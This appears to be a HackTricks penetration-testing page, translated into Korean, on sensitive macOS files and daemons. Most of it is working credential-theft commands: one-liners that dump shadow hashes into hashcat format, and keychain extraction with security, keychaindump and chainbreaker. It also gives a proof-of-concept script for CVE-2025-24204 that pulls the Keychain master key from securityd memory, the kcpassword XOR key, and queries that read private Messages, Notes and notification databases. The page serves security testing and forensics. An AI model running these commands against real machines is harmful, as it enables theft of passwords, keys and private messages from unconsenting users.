# macOS 민감한 위치 및 흥미로운 Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Passwords

### Shadow Passwords

Shadow password는 **`/var/db/dslocal/nodes/Default/users/`**에 위치한 사용자의 configuration과 함께 plist에 저장됩니다.\
다음 oneliner를 사용하면 **사용자에 대한 모든 정보**(hash 정보 포함)를 dump할 수 있습니다:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**이와 같은 Scripts**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 또는 [**이 Script**](https://github.com/octomagon/davegrohl.git)를 사용하여 hash를 **hashcat** **format**으로 변환할 수 있습니다.

모든 non-service account의 creds를 hashcat format `-m 7100` (macOS PBKDF2-SHA512)으로 dump하는 또 다른 one-liner:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
사용자의 `ShadowHashData`를 얻는 또 다른 방법은 `dscl`을 사용하는 것입니다: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

이 파일은 시스템이 **single-user mode**로 실행 중일 때만 사용됩니다(따라서 자주 사용되지는 않습니다).

### Keychain Dump

security binary를 사용하여 **복호화된 passwords를 dump**할 때는 여러 프롬프트에서 사용자가 이 작업을 허용해야 한다는 점에 유의하세요.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
최신 macOS에서 가장 흥미로운 backing store는 일반적으로 **`~/Library/Keychains/login.keychain-db`** 및 **`/Library/Keychains/System.keychain`**입니다. 이 파일들은 SQLite-backed 파일이지만, plaintext access는 여전히 **`securityd`**가 중개합니다. 따라서 raw DB를 탈취해도 사용자의 password, `SystemKey` 또는 메모리에 존재하는 master key를 함께 복구하지 않는 한 주로 metadata와 encrypted blobs만 얻을 수 있습니다.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> 이 comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 따르면 이러한 tools는 Big Sur에서 더 이상 작동하지 않는 것으로 보입니다.

### Keychaindump Overview

**keychaindump**라는 tool은 macOS keychains에서 password를 추출하기 위해 개발되었지만, [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에서 언급된 것처럼 Big Sur와 같은 최신 macOS version에서는 한계가 있습니다. **keychaindump**를 사용하려면 attacker가 access를 확보하고 privileges를 **root**로 escalate해야 합니다. 이 tool은 convenience를 위해 user login 시 기본적으로 keychain이 unlocked되어, applications가 사용자의 password를 반복해서 요구하지 않고 keychain에 access할 수 있다는 점을 악용합니다. 그러나 user가 매번 사용한 후 keychain을 lock하도록 설정하면 **keychaindump**는 효과가 없습니다.

**Keychaindump**는 **securityd**라는 특정 process를 대상으로 작동합니다. Apple은 **securityd**를 authorization 및 cryptographic operations를 담당하는 daemon으로 설명하며, keychain access에 필수적입니다. extraction process에는 user의 login password에서 파생된 **Master Key**를 식별하는 과정이 포함됩니다. 이 key는 keychain file을 읽는 데 필수적입니다. **Master Key**를 찾기 위해 **keychaindump**는 `vmmap` command를 사용해 **securityd**의 memory heap을 scan하고, `MALLOC_TINY`로 표시된 영역에서 potential key를 검색합니다. 다음 command를 사용하여 이러한 memory location을 검사합니다:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
잠재적인 master key를 식별한 후, **keychaindump**는 힙을 검색하여 master key 후보를 나타내는 특정 패턴(`0x0000000000000018`)을 찾습니다. 이 키를 사용하려면 추가 단계인 deobfuscation이 필요하며, 자세한 내용은 **keychaindump**의 소스 코드에 설명되어 있습니다. 이 영역을 분석하는 담당자는 keychain을 decrypt하는 데 필요한 핵심 데이터가 **securityd** 프로세스의 메모리에 저장된다는 점에 유의해야 합니다. **keychaindump**를 실행하는 예시 명령은 다음과 같습니다:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)는 다음과 같은 유형의 정보를 OSX keychain에서 forensic sound한 방식으로 추출하는 데 사용할 수 있습니다:

- [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 cracking하는 데 적합한 Hashed Keychain password
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

keychain unlock password, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)를 사용해 획득한 master key, 또는 SystemKey와 같은 unlock file이 있으면 Chainbreaker는 plaintext passwords도 제공합니다.

이러한 Keychain unlock 방법 중 하나가 없으면 Chainbreaker는 사용 가능한 다른 모든 정보를 표시합니다.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey로 keychain 키(비밀번호 포함) Dump**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **해시를 크래킹하여 keychain 키(비밀번호 포함) Dump하기**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain 키(password 포함) with memory dump**

[다음 단계를 따르세요](../index.html#dumping-memory-with-osxpmem) **memory dump**를 수행합니다.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **사용자 password를 사용하여 keychain keys (passwords 포함) dump**

사용자의 password를 알고 있다면 이를 사용하여 **사용자에게 속한 keychain을 dump하고 decrypt할 수 있습니다**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement를 통한 Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia)는 **`com.apple.system-task-ports.read`** entitlement가 포함된 `/usr/bin/gcore`를 제공했으므로, 모든 로컬 admin(또는 악성 signed app)이 SIP/TCC가 적용된 상태에서도 **모든 프로세스 메모리를 dump**할 수 있었습니다. `securityd`를 dump하면 **Keychain master key**가 평문으로 leak되어 사용자 password 없이 `login.keychain-db`를 decrypt할 수 있습니다.<sup>[1]</sup>

**취약한 빌드(15.0–15.2)에서의 빠른 재현:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
추출한 hex key를 Chainbreaker (`--key <hex>`)에 전달하여 login keychain을 decrypt합니다. Apple은 **macOS 15.3+**에서 해당 entitlement를 제거했으므로, 이는 패치되지 않은 Sequoia builds 또는 취약한 binary를 유지한 시스템에서만 작동합니다.

### kcpassword

**kcpassword** 파일은 **user의 login password**를 저장하는 파일이지만, system owner가 **automatic login**을 **활성화한** 경우에만 해당합니다. 따라서 password를 묻지 않고 user가 자동으로 로그인되므로, 보안성이 높지 않습니다.

password는 **`/etc/kcpassword`** 파일에 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** key로 xored되어 저장됩니다. user의 password가 key보다 길면 key가 재사용됩니다.\
따라서 예를 들어 [**이 스크립트**](https://gist.github.com/opshope/32f65875d45215c3677d)와 같은 scripts를 사용하면 password를 매우 쉽게 복구할 수 있습니다.

## Databases의 Interesting Information

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 알림

**`Sequoia`** 이전에는 일반적으로 Notification Center 저장소를 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**에서 찾을 수 있습니다. **`Sequoia+`**에서는 Apple이 이를 TCC로 보호되는 group container인 **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**로 이동했습니다.

대부분의 흥미로운 정보는 **`blob`** 열 내부에 저장되므로, 해당 콘텐츠를 추출하고 사람이 읽을 수 있는 형식으로 변환해야 합니다(`plutil -p -`, `strings` 또는 간단한 parser 사용). 빠른 triage 예시는 다음과 같습니다.
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### 최근 privacy issues (NotificationCenter DB)

- macOS **14.7–15.1**에서 Apple은 적절한 redaction 없이 `db2/db` SQLite에 banner content를 저장했습니다. **CVE-2024-44292/44293/40838/54504**를 통해 모든 local user가 TCC prompt 없이 DB를 열기만 해도 다른 users의 notification text를 읽을 수 있었습니다.
- Apple은 최신 Sequoia 빌드에서 DB를 `group.com.apple.usernoted`로 이동하고 TCC로 보호하여 이를 완화했습니다. 따라서 현재 시스템에서는 일반적으로 해당 user context 또는 이를 읽기 위한 TCC bypass가 필요합니다.<sup>[3]</sup>
- legacy endpoints에서는 artefacts를 보존하려면 업데이트하거나 reboot하기 전에 `db`, `db-wal`, `db-shm` 파일을 함께 복사하십시오.

### 참고

사용자의 **notes**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다.
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
위의 **one-liner**가 너무 많은 노이즈를 생성한다면, `ZICNOTEDATA.ZDATA`를 export하고 gunzip한 다음 protobuf를 parse하세요. 일반적으로 SQLite에서 직접 `strings`를 실행하는 것보다 더 안정적입니다.

### Background Tasks / Login Items

**Ventura**부터 사용자 승인을 받은 login items와 여러 background tasks가 **BTM** store에 추적됩니다. 예를 들면 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** 및 versioned system cache인 **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** 등이 있습니다.

이러한 파일은 persistence, helper tools 및 일부 MDM-managed background items를 빠르게 식별하는 데 유용합니다:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
persistence 관점과 BTM internals는 [the auto-start locations page](../../macos-auto-start-locations.md#login-items) 및 [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management)를 확인하세요.

## Preferences

macOS 앱에서 preferences는 **`$HOME/Library/Preferences`**에 있으며, iOS에서는 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`에 있습니다.

macOS에서는 cli tool **`defaults`**를 사용하여 **Preferences file을 수정**할 수 있습니다.

**`/usr/sbin/cfprefsd`**는 XPC services `com.apple.cfprefsd.daemon` 및 `com.apple.cfprefsd.agent`를 claim하며, preferences 수정과 같은 작업을 수행하도록 호출할 수 있습니다.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` 파일에는 node attributes에 적용되는 permissions가 포함되어 있으며 SIP로 보호됩니다.\
이 파일은 특정 사용자에게 uid가 아닌 UUID를 사용하여 permissions를 부여하므로, 해당 사용자는 `ShadowHashData`, `HeimdalSRPKey`, `KerberosKeys` 등의 특정 민감한 정보에 액세스할 수 있습니다:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## 시스템 알림

### Darwin 알림

알림을 위한 주요 daemon은 **`/usr/sbin/notifyd`**입니다. 알림을 수신하려면 클라이언트가 `com.apple.system.notification_center` Mach port를 통해 등록해야 합니다(`sudo lsmp -p <pid notifyd>`로 확인할 수 있습니다). daemon은 `/etc/notify.conf` 파일로 구성할 수 있습니다.

알림에 사용되는 이름은 고유한 reverse DNS 표기이며, 해당 이름 중 하나로 알림이 전송되면 이를 처리할 수 있다고 표시한 클라이언트가 알림을 수신합니다.

notifyd 프로세스에 SIGUSR2 시그널을 보내고 생성된 파일 `/var/run/notifyd_<pid>.status`를 읽으면 현재 상태를 dump할 수 있습니다(모든 이름도 확인할 수 있습니다):
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**는 주요 binary가 **`/usr/sbin/distnoted`**이며, notification을 전송하는 또 다른 방법입니다. 일부 XPC services를 노출하며 client를 확인하기 위한 검사를 수행합니다.

### Apple Push Notifications (APN)

이 경우 application은 **topics**에 등록할 수 있습니다. client는 **`apsd`**를 통해 Apple의 servers에 연결하여 token을 생성합니다.\
그런 다음 provider도 token을 생성하며, Apple의 servers에 연결하여 client에 messages를 전송할 수 있습니다. 이러한 messages는 **`apsd`**가 로컬에서 수신한 후, 이를 기다리고 있는 application으로 notification을 relay합니다.

preferences는 `/Library/Preferences/com.apple.apsd.plist`에 있습니다.

macOS에서는 `/Library/Application\ Support/ApplePushService/aps.db`에, iOS에서는 `/var/mobile/Library/ApplePushService`에 messages의 local database가 있습니다. 여기에는 `incoming_messages`, `outgoing_messages`, `channel`이라는 3개의 tables가 있습니다.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
다음을 사용하여 daemon 및 연결에 관한 정보를 확인할 수도 있습니다:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 사용자 알림

다음은 사용자가 화면에서 확인할 수 있는 알림입니다:

- **`CFUserNotification`**: 이 API는 메시지가 포함된 팝업을 화면에 표시하는 방법을 제공합니다.
- **The Bulletin Board**: iOS에서 배너를 표시하며, 배너는 사라진 후 Notification Center에 저장됩니다.
- **`NSUserNotificationCenter`**: MacOS의 iOS Bulletin Board입니다. 이전 macOS 릴리스에서는 데이터베이스가 일반적으로 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`에 있으며, Sequoia+에서는 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`로 이동되었습니다.

## References

- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
